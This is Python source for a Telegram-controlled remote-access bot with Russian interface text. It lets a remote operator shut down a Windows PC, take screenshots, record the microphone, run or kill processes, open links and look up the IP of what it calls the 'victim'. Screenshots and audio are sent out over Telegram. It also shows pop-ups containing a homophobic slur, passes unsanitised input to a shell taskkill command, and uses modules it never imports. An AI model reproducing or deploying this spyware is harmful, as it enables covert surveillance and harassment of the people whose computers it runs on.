import random,telebot,os,webbrowser,pyautogui,time,requests,re
from PIL import Image, ImageGrab
from bs4 import BeautifulSoup
from playsound import playsound



mytoken = 'telegram token'

bot = telebot.TeleBot(mytoken)

mainkeyboard = telebot.types.ReplyKeyboardMarkup(True, True)

mainkeyboard.row('Питание🟢','Запись🔊','Браузер🟡','Приложения🟥','ip🈴','Скриншот👀','Помощь⚒')


powerkeyboard = telebot.types.ReplyKeyboardMarkup(True, True)

powerkeyboard.row('Назад🗿','Выключить пк⚠️','Перезагрузить пк🖥')


appkeyboard = telebot.types.ReplyKeyboardMarkup(True, True)

appkeyboard.row('Назад🗿','Убить приложение❌','Включить приложение✅')




@bot.message_handler(content_types=['text'])
def commands(message):
        
        
        
        
        if message.text == '/start':
                bot.send_message(message.chat.id,'Выбери действие',reply_markup=mainkeyboard)
                
                
                
        elif message.text == 'Питание🟢':
                bot.send_message(message.chat.id,'Выбери действие',reply_markup=powerkeyboard)
                
    
        elif message.text == 'Приложения🟥':
            bot.send_message(message.chat.id,'Выбери действие',reply_markup=appkeyboard)


        elif message.text == 'Назад🗿':
                bot.send_message(message.chat.id,'Вернул вас назад',reply_markup=mainkeyboard)

        
    
        elif message.text == '/off' or message.text == 'Выключить пк⚠️':
                bot.send_message(message.chat.id,'Компьютер будет выключен!',reply_markup=powerkeyboard)
                os.system('shutdown -s')

        
        elif message.text == '/help' or message.text == 'Помощь⚒':
                 bot.send_message(message.chat.id,'/off(выкл пк)\n/open(открыть ссылку в браузере)\n/screen(сделать скриншот экрана)\n/process(включить процесс)\n/kill(убить процесс)\n/reboot(перезагрузить пк)\n/window(тест на гея)\n/ip(узнать ip,город,браузер)\n/rep(запустить файл.mp3)\n/record(записать звки с микрофона)',reply_markup=mainkeyboard)
                

              
        
        elif message.text == '/open' or message.text == 'Браузер🟡':
                bot.register_next_step_handler(message,get_url)
                bot.send_message(message.chat.id,'Отправьте ссылку!',reply_markup=mainkeyboard)
                

        elif message.text == '/screen' or message.text == 'Скриншот👀':
                try:  
                        os.remove("screenshot.png")
                        bot.send_message(message.chat.id,'Удалил старый скриншот,повторите команду',reply_markup=mainkeyboard)
                except:
                        bot.send_message(message.chat.id,'Делаю скриншот')
                        screen = pyautogui.screenshot('screenshot.png')
                        screen = open('screenshot.png', 'rb')
                        bot.send_photo(message.chat.id, screen,reply_markup=mainkeyboard)
                
        elif message.text == '/process' or message.text == 'Включить приложение✅':
                bot.send_message(message.chat.id,'Какой процесс хотите запустить(steam.exe)',reply_markup=appkeyboard)
                bot.register_next_step_handler(message,get_process)
        
        
        elif message.text == '/ip' or message.text == 'ip🈴':
                url = 'https://yandex.ru/internet/'
                page = requests.get(url)
                soup = BeautifulSoup(page.text, "html.parser")
                ip = soup.findAll('ul', class_='general-info layout__general-info')
                ip = str(ip)
                ip = re.sub('<[^>]*>', '\n', ip)
                bot.send_message(message.chat.id,'Айпи жертвы - ' + str(ip),reply_markup=mainkeyboard)
        
        
        
        elif message.text == '/window':
                pyautogui.alert("Ты пидор", "Тест", button="да")
                pyautogui.alert("Ты гей", "Тест", button="да")
                bot.send_message(message.chat.id,'Окна с тестом на гея созданы',reply_markup=mainkeyboard)
                
        elif message.text == '/kill' or message.text == 'Убить приложение❌':
                bot.send_message(message.chat.id,'Какой процесс хотите убить(steam.exe)')
                bot.register_next_step_handler(message,get_kill)                   
                
                
        elif message.text == '/reboot' or message.text == 'Перезагрузить пк🖥':
                bot.send_message(message.chat.id,'Перезагрузил!')
                os.system('shutdown -r -t 0')

        elif message.text == '/rep':
                bot.send_message(message.chat.id,'Какой файл вы хотите включить?')
                bot.register_next_step_handler(message,get_audio)    
  

        
        
        elif message.text == '/record' or message.text == 'Запись🔊':
                bot.send_message(message.chat.id,'Сколько секунд записать?(не больше 60):')
                bot.register_next_step_handler(message,get_record)

           


        
        
def get_record(message):
        global record
        record = message.text
        try:
                record = int(record)
                if record < 60:
                        bot.send_message(message.chat.id,'Записываю,подожди')
                        CHUNK = 1024
                        FORMAT = pyaudio.paInt16
                        CHANNELS = 1
                        RATE = 44100
                        RECORD_SECONDS = record
                        WAVE_OUTPUT_FILENAME = "audio.wav"
                        p = pyaudio.PyAudio()
                        stream = p.open(format=FORMAT,
                                        channels=CHANNELS,
                                        rate=RATE,
                                        input=True,
                                        input_device_index=1, 
                                        frames_per_buffer=CHUNK)
                        frames = []
                        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                            data = stream.read(CHUNK)
                            frames.append(data)
                        stream.stop_stream()
                        
                        stream.close()
                        
                        p.terminate()

                        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
                        
                        wf.setnchannels(CHANNELS)
                        
                        wf.setsampwidth(p.get_sample_size(FORMAT))
                        
                        wf.setframerate(RATE)
                        
                        wf.writeframes(b''.join(frames))
                        
                        wf.close()

                        audio = open('audio.wav', 'rb')
                        
                        bot.send_audio(message.chat.id, audio)


                else:
                        bot.send_message(message.chat.id,'сказано не больше 60sec!',reply_markup=mainkeyboard)
                
        except:
                bot.send_message(message.chat.id,'в числовом формате!',reply_markup=mainkeyboard)

        
        
        
def get_audio(message):
        global audio
        audio = message.text
        try:
                playsound(audio)
                bot.send_message(message.chat.id,'Включил данный файл\n ' + audio,reply_markup=mainkeyboard)
        except:
                bot.send_message(message.chat.id,'Не нашел данный файл\n ' + audio,reply_markup=mainkeyboard)
                
                




def get_url(message):
        global url
        url = message.text
        webbrowser.open_new(url)
        bot.send_message(message.chat.id,'Ссылка открыта!',reply_markup=mainkeyboard)


        
        
def get_process(message):
        global process
        process = message.text
        try:
                os.startfile(process)
                bot.send_message(message.chat.id,'Включил данный процесс\n' + process,reply_markup=appkeyboard)
        except:
                 bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!',reply_markup=mainkeyboard)

                        
                        
                        
                        
def get_kill(message):
        global kill
        kill = message.text
        try:
                os.system("taskkill /im " + kill)
                bot.send_message(message.chat.id,'Данный процесс убит\n' + kill,reply_markup=appkeyboard)
        except:
                bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!',reply_markup=mainkeyboard)

                
                        
         
try:
        bot.polling(none_stop=True, interval=0)
except:
        pass
